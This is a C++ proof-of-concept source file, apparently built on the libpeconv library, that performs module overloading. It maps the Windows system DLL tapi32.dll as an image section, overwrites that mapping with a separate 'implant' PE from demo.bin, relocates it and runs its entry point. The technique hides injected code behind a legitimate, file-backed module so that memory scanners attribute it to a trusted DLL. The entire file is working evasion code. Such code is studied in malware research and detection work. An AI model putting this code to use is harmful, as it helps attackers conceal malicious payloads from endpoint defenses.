#include <Windows.h>
#include <iostream>

#include <peconv.h>

#include "ntddk.h"

PVOID map_dll_image(const char* dll_name)
{
	HANDLE hFile = CreateFileA(dll_name,
		GENERIC_READ,
		0,
		NULL,
		OPEN_EXISTING,
		FILE_ATTRIBUTE_NORMAL,
		NULL
	);
	if (!hFile || hFile == INVALID_HANDLE_VALUE) {
		std::cerr << "Couldn't open the file!" << std::hex << hFile << std::endl;
		return NULL;
	}
	std::cout << "File created, handle: " << std::hex << hFile << std::endl;

	HANDLE hSection = nullptr;
	NTSTATUS status = NtCreateSection(&hSection,
		SECTION_ALL_ACCESS,
		NULL,
		0,
		PAGE_READONLY,
		SEC_IMAGE,
		hFile
	);
	bool is_ok = false;
	if (status != STATUS_SUCCESS) {
		std::cerr << "NtCreateSection failed" << std::endl;
	}
	else {
		std::cerr << "NtCreateSection created at:" << std::hex << hSection << std::endl;
		is_ok = true;
	}

	CloseHandle(hFile);
	if (!is_ok) {
		return NULL;
	}

	DWORD protect = PAGE_EXECUTE_READWRITE;
	PVOID sectionBaseAddress = NULL;
	ULONG viewSize = 0;
	SECTION_INHERIT inheritDisposition = ViewShare; //VIEW_SHARE
	if ((status = NtMapViewOfSection(hSection,
		GetCurrentProcess(),
		&sectionBaseAddress,
		NULL,
		NULL,
		NULL,
		&viewSize,
		inheritDisposition,
		NULL,
		protect)
		) != STATUS_SUCCESS)
	{
		printf("[ERROR] NtMapViewOfSection failed, status : %x\n", status);
	}
	else {
		printf("Section BaseAddress: %p\n", sectionBaseAddress);
		is_ok = true;
	}
	return sectionBaseAddress;
}

bool overwrite_mapping(PVOID mapped, BYTE* implant_dll, size_t implant_size)
{
	HANDLE hProcess = GetCurrentProcess();
	bool is_ok = false;

	DWORD oldProtect = 0;
	if (!VirtualProtect((LPVOID)mapped, implant_size, PAGE_READWRITE, &oldProtect)) return false;

	memcpy(mapped, implant_dll, implant_size);
	/*
	SIZE_T number_written = 0;
	if (WriteProcessMemory(hProcess, (LPVOID)mapped, implant_dll, implant_size, &number_written)) {
		is_ok = true;
		std::cout << "Written: " << std::hex << number_written << "\n";
	}*/
	if (!VirtualProtect((LPVOID)mapped, implant_size, PAGE_EXECUTE_READWRITE, &oldProtect)) return false;
	return is_ok;
}

int main(int argc, char *argv[])
{
	/*if (argc < 3) {
		std::cerr << "Supply the files!\n<dll_to_map> <dll_to_implant>" << std::endl;
		system("pause");
		return -1;
	}*/
	const char* dll_name = "C:\\Windows\\SysWOW64\\tapi32.dll"; //argv[1];
	const char* implant_name = "demo.bin"; //argv[2];

	bool is_ok = true;

	PVOID mapped = map_dll_image(dll_name);
	if (!mapped) {
		system("pause");
		return -1;
	}
	size_t v_size = 0;
	BYTE* implant_dll = peconv::load_pe_executable(implant_name, v_size);
	if (!implant_dll) {
		std::cerr << "Failed to load the implant!\n";
		system("pause");
		return -1;
	}

	//relocate the module to the target base:
	peconv::relocate_module(implant_dll, v_size, (ULONGLONG)mapped, (ULONGLONG)implant_dll);

	if (overwrite_mapping(mapped, implant_dll, v_size)) {
		std::cout << "Copied!\n";
	}
	DWORD ep = peconv::get_entry_point_rva(implant_dll);

	peconv::free_pe_buffer(implant_dll); implant_dll = NULL;

	BOOL(*dll_main)(HINSTANCE, DWORD, LPVOID) = (BOOL(*)(HINSTANCE, DWORD, LPVOID))((ULONG_PTR)mapped + ep);

	std::cout << "Executing Implant's Entry Point: " << std::hex << dll_main << "\n";
	dll_main((HINSTANCE)mapped, DLL_PROCESS_ATTACH, 0);

	system("pause");
	return is_ok ? 0 : -1;
}
